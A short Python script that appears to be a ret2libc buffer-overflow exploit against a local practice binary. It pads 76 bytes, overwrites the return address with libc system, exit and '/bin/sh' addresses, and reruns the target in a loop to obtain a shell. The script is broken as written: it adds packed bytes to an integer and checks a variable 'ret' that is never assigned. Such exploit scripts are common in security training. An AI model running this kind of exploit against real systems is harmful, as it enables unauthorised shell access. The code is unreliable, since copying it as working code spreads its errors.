#!/usr/bin/python3

import sys
from struct import pack
from subprocess import call

if __name__ == '__main__':

	# EIP -> system + exit + bin_sh

	base_libc_addr = 0xb7d4b000

	system_addr_off = pack("<I", 0x0003adb0)
	exit_addr_off = pack("<I", 0x0002e9e0)
	bin_sh_addr_off = pack("<I", 0x0015bb2b)

	system_addr = pack("<I", system_addr_off + base_libc_addr)
	exit_addr = pack("<I", exit_addr_off + base_libc_addr)
	bin_sh_addr = pack("<I", bin_sh_addr_off + base_libc_addr)

	offset = 76
	junk = b"A"*offset
	EIP = system_addr + exit_addr + bin_sh_addr

	payload = junk + EIP

	while True:

		call(["/home/test/ret2libc/fileVuln", payload])
		if ret == 0:
			print("\n[!] Exiting...\n")
			sys.exit(0)
